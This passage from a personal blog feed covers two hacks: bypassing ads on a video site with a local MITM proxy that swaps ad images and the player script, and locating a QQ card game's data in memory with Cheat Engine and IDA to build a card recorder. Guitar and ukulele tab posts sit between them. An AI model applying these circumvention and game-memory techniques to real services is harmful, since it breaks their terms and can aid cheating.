            &lt;span class="nx"&gt;_0xf706xb1&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;parseInt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_0xf706xb0&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;_0xf706x3&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="nx"&gt;callAdd&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_0xf706xae&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;_0xf706xaf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;_0xf706xb0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;_0xf706xb2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;_0xf706xb1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;_0xf706xb3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;setInterval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;_0xf706xb4&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.second&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;_0xf706xb4&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;text&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="nx"&gt;_0xf706xb2&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="mi"&gt;980&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.ads-control&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;remove&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]();&lt;/span&gt;
        &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;_0xf706xb4&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.second&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;clearInterval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_0xf706xb3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;_0xf706xb4&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;text&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;CKobject&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nx"&gt;CKobject&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;getObjectById&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="nx"&gt;_vp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ckid&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;videoPlay&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]()&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="nx"&gt;_0xf706xb1&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nx"&gt;_0xf706xb1&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;1020&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;EmbedFlash&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_0xf706x24&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x2b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x2a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x4f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x50&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x2b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;_vp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;playlistM&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;_vp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;playlistM&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;length&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_0xf706x4f&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x4f&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;wa&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x4f&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;timeout&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="p"&gt;...&lt;/span&gt;
            &lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_vp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;TirggerPending&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x4f&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;timeout&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其中最关键的应该就是&lt;code&gt;PlayAds&lt;/code&gt;这个函数了，基本就是读取广告然后丢到Flash中，这里的&lt;code&gt;settimeout&lt;/code&gt;用于时间到了之后把广告的div移调。另外&lt;code&gt;CheckPlay&lt;/code&gt;是用来检测状态改变的(相当于刷新器)，因此需要把值改的要比较小，否则就会出现上面的值改小了却不生效的情况。&lt;/p&gt;
&lt;h3&gt;移除广告&lt;/h3&gt;
&lt;p&gt;有时候灵光一闪真的很重要，还记得当年比CTF睡觉时候突然有思路爬起来增援刷夜的老曾和潘神的情况。判断AdBlock这类插件是否存在的原理上面已经说了，就是只要设定一个timeout，过了timeout之后看这个资源有没有下载成功即可。因此直接屏蔽资源肯定是不行的，思路就变成了伪造一个正常的资源。之后就想到CSS1/2标准不完善的时候一个hack div的技巧，于是构造了一个1px x 1px的透明gif图片，直接替换掉所有广告图片，这样对于检测程序来说，依然认为ad下载成功，而事实上什么都看不到喽。&lt;/p&gt;
&lt;h1&gt;自动化去广告&lt;/h1&gt;
&lt;p&gt;这里没有采用开发一个Chrome Extension的方案，原因主要是Chrome团队是很激进的（褒义词），为了推动web标准进步和增强浏览器安全问题费尽了心思，比如这儿修改response body本身会或者将会受到Chrome API的限制。于是直接就用炉火纯青的中间人攻击(mitm)解决这个问题，网上随便找了个&lt;a href="https://github.com/abhinavsingh/proxy.py"&gt;HTTP Proxy&lt;/a&gt;，code写的不错，全是Python原生库。之后主要修改下处理response body的环节：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; def _process_response(self, data):
        # parse incoming response packet
        # only for non-https requests
        if not self.request.method == b&amp;quot;CONNECT&amp;quot;:
            self.response.parse(data)

        # print self.request.host_, self.request.url_
        if self.request.host_ and self.request.host_.endswith(&amp;#39;dnvod.tv&amp;#39;):
            # ads
            one_px_gif_data = &amp;#39;R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7&amp;#39;
            if self.request.url_ and self.request.url_.startswith(&amp;#39;/upload/video&amp;#39;):
                if os.path.splitext(self.request.url_)[-1] in (&amp;#39;.jpg&amp;#39;, &amp;#39;.gif&amp;#39;):
                    data = base64.b64decode(one_px_gif_data)

            # count down
            if self.request.url_ and self.request.url_ == &amp;#39;/js/2016/playerselection-1.2.7.90.js&amp;#39;:
                with open(&amp;#39;dn_replace.js&amp;#39;, &amp;#39;r&amp;#39;) as f:
                    data = f.read()

        # queue data for client
        self.client.queue(data)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我这儿对于修改好的js直接存在文件里了，所以读取后替换。对于1px的transparent gif，实在没必要专门创建个文件然后浪费一次io，于是直接base64了这个图片的byte。&lt;/p&gt;
&lt;p&gt;之后浏览器代理挂好，对于&lt;code&gt;*.dnvod.tv&lt;/code&gt;的流量转向这个代理即可。&lt;/p&gt;
&lt;h2&gt;Update: 2018-02-25&lt;/h2&gt;
&lt;p&gt;据网友Orooz反应，程序在Windows下不可用，测试后发现原本使用的HTTP Proxy在Windows下无法正常工作，遂使用&lt;a href="https://github.com/inaz2/proxy2"&gt;proxy2&lt;/a&gt;替换之。原理完全一样，直接贴修改的代码。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def response_handler(self, req, req_body, res, res_body):
        url = urlparse.urlparse(req.path)
        url_domain = url.netloc
        url_path = url.path

        if url_domain and url_domain.endswith(&amp;#39;dnvod.tv&amp;#39;):
            # ads
            one_px_gif_data = &amp;#39;R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7&amp;#39;
            if url_path and url_path.startswith(&amp;#39;/upload/video&amp;#39;):
                if os.path.splitext(url_path)[-1] in (&amp;#39;.jpg&amp;#39;, &amp;#39;.gif&amp;#39;):
                    res_body = base64.b64decode(one_px_gif_data)

            # count down
            if url_path and url_path == &amp;#39;/js/2016/playerselection-1.2.7.90.js&amp;#39;:
                with open(&amp;#39;dn_replace.js&amp;#39;, &amp;#39;r&amp;#39;) as f:
                    res_body = f.read()

            return res_body
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;意外收获是该Proxy支持HTTPS的mitm。&lt;/p&gt;
&lt;h1&gt;后续&lt;/h1&gt;
&lt;p&gt;其实从防御方来说，修改Flash Player本身可以明显增加破解门槛，在Flash内部强制限定广告时间，广告资源本身甚至可以固化到Flash的内置资源列表中，这样不会产生单独的下载流量。但是缺点也显而易见，每次广告更新都要完整更新这个播放器，维护成本不可小觑。另外对于空白图片，也可以在前端检测一下（比如图片byte是否固定，图片大小如何，不过这类检测脚本也可以被中间人替换了或者被重新构造的资源绕过）。&lt;/p&gt;
&lt;p&gt;从攻击方来说，后续需要的基本增强就是对于https时候mitm，不过这个就是一个库两个证书的问题。另外就是对于规则的修订问题了。进一步说，如果防御方真修改了Flash Player，那就decompile这个播放器然后替换之...&lt;/p&gt;
&lt;p&gt;攻防本身就是个矛盾体，只要平衡其实就好。毕竟Amazon和Walmart还天天互爬数据并互相屏蔽对方的爬虫呢。&lt;/p&gt;
&lt;p&gt;一开始没有选择修改request是个阴差阳错，但是这个反而成为了后续的优势。因为修改的request payload可以被服务器鉴别，而response已经返回到了本地，主动权完全在我方，因此可以被任意修改而服务器并不知道中间人的存在。而没有写成Chrome Extension也是为了突破Chrome API目前以及将来的种种限制。这两点都为后续可能存在的更强的反广告策略提供了保障。&lt;/p&gt;
&lt;p&gt;懒癌最后扯一句：只要多瑙不更新，伦家是不会主动更新的嘤嘤嘤。&lt;/p&gt;</content><category term="bypass"></category><category term="mitm"></category><category term="hacking"></category></entry><entry><title>五月天《你说那C和弦就是...》Ukulele谱</title><link href="http://blog.yyx.me/posts/ni_shuo_na_c_he_xian_jiu_shi-ukulele-tab.html" rel="alternate"></link><published>2016-10-17T18:41:00-07:00</published><updated>2016-10-17T18:41:00-07:00</updated><author><name>YYX</name></author><id>tag:blog.yyx.me,2016-10-17:/posts/ni_shuo_na_c_he_xian_jiu_shi-ukulele-tab.html</id><summary type="html">&lt;p&gt;完整的五月天《你说那C和弦就是...》Ukulele谱。&lt;/p&gt;</summary><content type="html">&lt;h1&gt;写在前面&lt;/h1&gt;
&lt;p&gt;1年多没写博了，不知道是因为太忙了太懒了还是因为太无所事事了。&lt;/p&gt;
&lt;p&gt;9月底龙童鞋回国，把曾经带给她好心情的Ukulele转送给我保管。由于开学初事情多，直到最近几天才翻出来耍耍。记得上次（也是初次）玩小U还是留学前去深圳看叽歪的时候，那时候2欣家有一把Ukulele用来当装饰品……这一晃就2年多了。&lt;/p&gt;
&lt;p&gt;最近听五月天的新专《自传》，感觉依然是熟悉的配方熟悉的味道（就比如《终于结束的起点》听出了《仓颉》的感觉）。《你说那C和弦就是...》比较简单上口，内容上有点《T1213121》的感觉，“四大和弦一套指法弹吉他”，和弦进行也是非常模式化的1564。&lt;/p&gt;
&lt;h1&gt;谱子&lt;/h1&gt;
&lt;p&gt;当时就是随便搜了个谱子，后来发现是“鱼仔”家的(原来玩Uku的时候用过他的谱子，感觉挺好的），于是就拿来瞎弹了一会。不过感觉谱子还是太单一，就稍微改编了下加入了更多变化。选调是C调，和原调一致，4/4拍，标准调弦。&lt;/p&gt;
&lt;p&gt;&lt;img alt="ni_shuo_na_c_he_xian_jiu_shi" src="../statics/ni_shuo_na_c_he_xian_jiu_shi-ukulele-tab/tab.jpg"&gt;&lt;/p&gt;
&lt;p&gt;非和弦的地方我直接在纸上画了谱子，然后扫到电脑里的（没Ukulele的制谱软件，标注我也是按照吉他谱画的）。节奏型总共3个，和弦后面括号里的数字标注了相对应的节奏型。副歌1和主歌2中间的间奏和结尾部分可以用一点点滑音，整体会更加连贯出彩。&lt;/p&gt;
&lt;p&gt;Ukulele的低音表现基本就是没有，不过用来直接搞这些欢快的歌还是可以的。&lt;/p&gt;</content><category term="ukulele"></category><category term="tab"></category></entry><entry><title>张震岳《小宇》吉他谱（单吉他重新编配Solo）</title><link href="http://blog.yyx.me/posts/xiaoyu-guitar-solo-tab.html" rel="alternate"></link><published>2015-08-27T15:58:00-07:00</published><updated>2015-08-27T15:58:00-07:00</updated><author><name>YYX</name></author><id>tag:blog.yyx.me,2015-08-27:/posts/xiaoyu-guitar-solo-tab.html</id><summary type="html">&lt;p&gt;本文包含张震岳《小宇》完整吉他谱：其中Solo部分单独编配，满足单吉他弹唱演奏。&lt;/p&gt;</summary><content type="html">&lt;h1&gt;算个引子&lt;/h1&gt;
&lt;p&gt;一直很喜欢阿岳的《小宇》，简单、真诚的情感流露。当然，这首青涩的情歌也成了泡妹子必备/必杀歌曲之一（虽然我不是这个目的你们爱信不信）。不过网络上大多只有主歌和副歌的和弦谱（Solo部分为和弦分解），比较完善的谱子虽然有前奏尾奏和独立Solo，但Solo部分普遍是双吉他配合的，因此没法一个人完成弹(zhuang)唱(x)，毕竟你不能和妹子单独约个会还叫上兄弟吧。&lt;/p&gt;
&lt;p&gt;于是乎，寡人就想着自己捣鼓一个（听起来好牛X的样子）。可是因为拖延症就一直没搞…… 昨晚上突然大脑充血，“做个文艺B”的口号响彻脑门，趁着荷尔蒙还不知道是多巴胺的那股劲儿，就草草编配了一下。&lt;/p&gt;
&lt;h1&gt;Solo&lt;/h1&gt;
&lt;p&gt;&lt;img alt="xiaoyu solo" src="../statics/xiaoyu-guitar-solo-tab/xiaoyu-solo.jpg"&gt;&lt;/p&gt;
&lt;p&gt;电子合成音效果试听：&lt;/p&gt;
&lt;p&gt;&lt;audio controls&gt;
  &lt;source src="../statics/xiaoyu-guitar-solo-tab/xiaoyu-solo.mp3" type="audio/mpeg"&gt;
Your browser does not support the audio element.
&lt;/audio&gt;&lt;/p&gt;
&lt;p&gt;本Solo谱是根据下面这个主谱来编配，因此什么都得按照主谱子来：标准调弦降半音。&lt;/p&gt;
&lt;h1&gt;主谱&lt;/h1&gt;
&lt;p&gt;下面上主谱，版权归原作者和www.jitaba.cn所有。其中我标红色的部分替换成我编配的Solo即可。&lt;/p&gt;
&lt;p&gt;需要注意的是，原版的伴奏从我标黄色的部分开始有鼓点的配合，因此请即兴加入闷音模仿鼓的节奏，这样和Solo部分的感觉相似，可以平滑过渡，同时提升整个曲子的Feel。&lt;/p&gt;
&lt;p&gt;&lt;img alt="xiaoyu 1" src="../statics/xiaoyu-guitar-solo-tab/xiaoyu-1.jpg"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="xiaoyu 2" src="../statics/xiaoyu-guitar-solo-tab/xiaoyu-2.jpg"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="xiaoyu 3" src="../statics/xiaoyu-guitar-solo-tab/xiaoyu-3.jpg"&gt;&lt;/p&gt;
&lt;p&gt;从遵循原版的角度来说，原版Solo结束后为：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我不管未来会怎麽样
至少我们现在很开心
我不管结局会怎麽样
至少想念的人是你
&lt;B&gt;我不管未来会怎麽样
但我每天都想见到你&lt;/B&gt;
我不管结局会怎麽样
我想真的跟你在一起
如果你还是没法相信
真的没关系 我会安静的离去&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;加粗部分是主谱漏掉的，只需要重复一下几个和弦即可。&lt;/p&gt;
&lt;p&gt;Enjoy!&lt;/p&gt;</content><category term="guitar"></category><category term="solo"></category><category term="tab"></category><category term="小宇"></category><category term="吉他谱"></category></entry><entry><title>QQ双扣记牌器实现</title><link href="http://blog.yyx.me/posts/qq-card-game-recorder.html" rel="alternate"></link><published>2015-05-12T01:17:00-07:00</published><updated>2015-05-12T01:17:00-07:00</updated><author><name>YYX</name></author><id>tag:blog.yyx.me,2015-05-12:/posts/qq-card-game-recorder.html</id><summary type="html">&lt;p&gt;本文讨论了腾讯QQ游戏大厅新双扣角色版记牌器的设计、数据抓取的思路及方法以及最终记牌器的实现细节。&lt;/p&gt;</summary><content type="html">&lt;h1&gt;吐槽&lt;/h1&gt;
&lt;p&gt;到USC刷master真可谓“玩命”读书，在学校被大神虐，在路上怕被黑哥虐，出去玩耍被款爷虐，逢年过节被秀恩爱的虐，总之就是各种不择手段花式虐狗。再加上这学期悲剧的选课，期末下来，已经基本气绝。考闭，准备打打牌找找乐子，作为杭州人，当然最爱双扣，但是当你发现双扣竟然在4月底被企鹅的程序猿改的面目全非之后，就有种气急败坏的却又无从抱怨的感觉。&lt;/p&gt;
&lt;p&gt;也不知道怎么想的，突然很想搞一个自己的记牌器玩玩（我承认这儿转折很突兀，因为我自己也不知道为什么当时还没来得及拍脑门就决定了），最后竟然三天抛出成品（不可避免有小bug），于是决定撰文记录一下，行文就按照日子来了。&lt;/p&gt;
&lt;p&gt;我这边测试的双扣可执行文件skrpg.exe的文件版本是2.0.107.14，MD5为1c6d85c0accf6ce1a834e947e5467412。很可能游戏更新后数据会有所不同（新版本刚出来更新会特别频繁），但是思路不变的，你需要再机械劳动一次更新所有数据。&lt;/p&gt;
&lt;h1&gt;Day1 抓数据&lt;/h1&gt;
&lt;p&gt;其实第一天的时候还没决定真的做出个记牌器，就想研究下这玩意是怎么实现的（好奇心害死猫）。&lt;/p&gt;
&lt;p&gt;记牌器实现基本是两种思路：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一种是图形匹配，就是抓窗口的牌面，其实这儿做匹配还是很简单的，毕竟牌面的样子是不会变的，也不需要什么复杂的匹配算法，只要弄下来所有牌面搞个数据库，直接就可以匹配得到数据。难度在于，窗口是可以缩放的，因此牌桌大小不固定，牌的相对位置不清楚是不是按照比例算的；另外，新版双扣是所谓的角色版，添加了一些动画效果，这些效果出现的时候会覆盖一部分牌面，而且是动态的，因此这个时候抓取牌面就不是一种一成不变的情况。&lt;/li&gt;
&lt;li&gt;第二种是抓数据，这种没有第一种直观，很多时候需要靠推理和碰运气去猜测数据保存在内存中的形式，当然如果数据在内存中被加密了，那就更倒霉了。但是一旦能正确抓出数据并解码，实现就非常简单，而且正确率是100%。当然抓数据不局限于内存数据，很多时候可能是网络数据，那就需要抓包啦。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我选了第二种，抓取工具是Cheat Engine，直接从内存抓取。首先初步判断下需要抓取的数据：所有玩家的当前剩余的牌数，所有玩家每次出的牌，自己的座位，发牌后自己的牌（你一定得不到别人的牌面，这些都在服务器上，如果你能得到那就直接做作弊器了）。&lt;/p&gt;
&lt;h2&gt;玩家剩余牌数&lt;/h2&gt;
&lt;p&gt;这是思路最简单且最好抓的一步。一个思维正常的程序猿一般都会用整数类型来记录，也就是有符号整形，因此直接抓DWORD长度数据，根据牌数量变化，不断缩小范围，依次在内存中找出4个玩家的剩余牌数位置，找到位置后用CE查找谁access/write了这些位置，这就是我们要找的地址。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;DOWN:   &amp;quot;GameLogic.dll&amp;quot;+3CF20
LEFT:   &amp;quot;GameLogic.dll&amp;quot;+3CE30
UP:     &amp;quot;GameLogic.dll&amp;quot;+3D100
RIGHT:  &amp;quot;GameLogic.dll&amp;quot;+3D010
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这里的的DOWN、LEFT、UP、RIGHT是我用来表示玩家的座位的，这些座位是大厅中座位的绝对位置，理解这点很重要。从拿到这些数据来看，这些位置是静态的（相对GameLogic.dll加载基址的偏移），So easy!&lt;/p&gt;
&lt;h2&gt;自身座位号&lt;/h2&gt;
&lt;p&gt;这是一个比较奇葩但必须解决的问题。还是假设企鹅的程序猿是不脑残的，那座位号应该是设计成连续排布的，可能是0-3，也可能是1-4（当然如果是个标准程序猿应该选前者，除非他是base为1的VB党），座位号的排列可能是顺时针，也可能是逆时针，当然还有可能跳着排列（这个可能性很小）。于是排列组合一下，每种情况起始位置可能有4种，算上顺时针逆时针就是有4x2=8种，所以0-3和1-4在连续排布情况下有16种可能性。在云计算的年代，16是个多么渺小的数据，直接brutal force，每种测试一次就行。测试方法就是选取16种中的一种，假设当前这个case成立，那这个座位应该是X，进入下一个座位，应该是Y，这样依次测试，如果每次抓出来的数据都符合判断，就是这个case了。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  2
1   3
  0
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;最后得到的结果是上面这种情况，0是DOWN，1是LEFT，2是UP，3是RIGHT，这些位置依然是大厅中的绝对位置。这里要提一句，找座位的时候可能会找到一个地址，每次都自增1，当时我还以为是这个，后来发现换了超过4个座位后它的数据依然在增长，测试后发现它是用来记录玩家在这桌入座了几次，不知企鹅程序猿设计这个数据有什么用……&lt;/p&gt;
&lt;p&gt;我天真的以为座位号确定了，那座位号在内存中的位置也就确定了。但是当我点进去看access的地址处的反汇编的时候：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;02D30214 - 8B 4D F4  - mov ecx,[ebp-0C]
02D30217 - 8B 55 F8  - mov edx,[ebp-08]
02D3021A - 89 14 88   - mov [eax+ecx*4],edx &amp;lt;&amp;lt;
02D3021D - 6A 01 - push 01
02D3021F - 66 8B 45 F4  - mov ax,[ebp-0C]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;很遗憾，这玩意地址不是固定的，因此需要找它的指针，很可能还要找它指针的指针，甚至更多层。当我找了两层之后，发现依然是变化的地址。无奈调出IDA完整的看了下这段反汇编，发现竟然是基于ebp的传入参数，因此是不固定的。此时突然想到CE有个自动找指针的功能，于是请出这个牛X的大杀器，瞬间1个G的指针数据就算出来了（这凭人手来找得找到什么时候），发现竟然有5层左右的指针调用，还都是不同基址的，筛选下2-3层的调用，找到一个相对可以接受的偏移：&lt;code&gt;[[["GameLogic.dll"+3DCB4]+88]+4]&lt;/code&gt;，而且基址和前面算玩家剩余牌数的一致，Perfect!&lt;/p&gt;
&lt;h2&gt;牌面数据&lt;/h2&gt;
&lt;p&gt;牌面数据的推断简直就是拼脑洞。初步想一下牌面可能涉及到数据是花色和点数，虽然花色在双扣中是没有意义的，但是对于游戏的显示来说，花色是必须要的，因为花色是牌属性的一部分。当你想到这儿的时候你会发现，牌的存储很可能是一个自定义的数据类型，而这个类型的格式是不知道的，自定义格式中每个字段长度也是不知道的，双扣有两副牌，因此包含大小王在内有等于或超过两张以上的重复牌，每次出牌数量是不确定的，因此也不知道此时内存中牌有几张，这一组牌用什么方式被表示。我凭借自认为碉堡的智商在脑洞大开的情况下猜测了几次，发现这个捷径走不了，老老实实开IDA看反汇编去……&lt;/p&gt;
&lt;p&gt;首先判断牌面的数据处理应该也是在GameLogic.dll中，直接分析这个模块文件，当然一般情况下不可能从头看反汇编，这样的搜索效率太低了。查看一下模块的导出表，没有有价值的函数入口，于是从字符串找突破口。字符串中出现诸如&lt;code&gt;CCardsGameLogic::OnGameStart\n&lt;/code&gt;样子的函数名，点进去发现是回调函数，还有类似&lt;code&gt;RefreshCardsInHand\n&lt;/code&gt;的debug用的字符串，不过这些位置的上下文都没有提供有价值的信息。又尝试了一些方式都没有很好的突破口，但是作为一个懒人，怎么能向从头刷代码那么low的方式低头呢？于是准备继续开脑洞……&lt;/p&gt;
&lt;p&gt;猜测一下特征数据。每副牌54张，双扣一共2副牌108张，4个人打，每个人就是27张。初始化的时候应该会每个人发27张牌，那时候应该会有个循环分配这27张牌。于是直接在IDA中找立即数27，发现一处有价值的代码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;10020&lt;/span&gt;&lt;span class="nf"&gt;D8C&lt;/span&gt; &lt;span class="c"&gt;; int __stdcall sub_10020D8C(COleControl *)&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10020&lt;/span&gt;&lt;span class="no"&gt;D8C&lt;/span&gt; &lt;span class="no"&gt;sub_10020D8C&lt;/span&gt;    &lt;span class="no"&gt;proc&lt;/span&gt; &lt;span class="no"&gt;near&lt;/span&gt;               &lt;span class="c"&gt;; CODE XREF: sub_10007D2E+97p&lt;/span&gt;
